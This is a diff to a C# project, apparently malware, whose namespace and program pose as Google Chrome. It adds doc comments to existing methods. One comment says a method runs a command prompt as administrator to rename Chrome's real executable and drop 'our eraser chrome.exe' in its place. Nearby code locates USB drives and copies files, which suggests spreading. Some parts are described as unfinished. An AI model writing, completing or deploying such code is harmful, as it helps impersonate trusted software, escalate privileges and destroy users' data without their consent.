@@ -5,6 +5,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Security.Principal;
+using System.Linq;
 
 namespace chrome
 {
@@ -87,6 +88,11 @@ namespace chrome
             Process.Start("chrome.exe");
         }
 
+        /// <summary>
+        /// Retrieves the USB devices connected to the system.
+        /// I'm working on this and doesn't work by now.
+        /// </summary>
+        /// <returns>Path to USB devices</returns>
         private string alvGetUsbDrivePath()
         {
             string pathToDrive = null;
@@ -139,6 +145,10 @@ namespace chrome
             File.Copy(filePath, Path.Combine(path, fileName));
         }
 
+        /// <summary>
+        /// Runs a command prompt as administrator. It is supposed to change the Google Chrome main executable
+        /// to chromer.exe or whatever name you want and then copy our eraser chrome.exe to that directory.
+        /// </summary>
         private void alvRunCmdAsAdminBackground()
         {
             System.Diagnostics.ProcessStartInfo myProcessInfo = new System.Diagnostics.ProcessStartInfo(); //Initializes a new ProcessStartInfo of name myProcessInfo
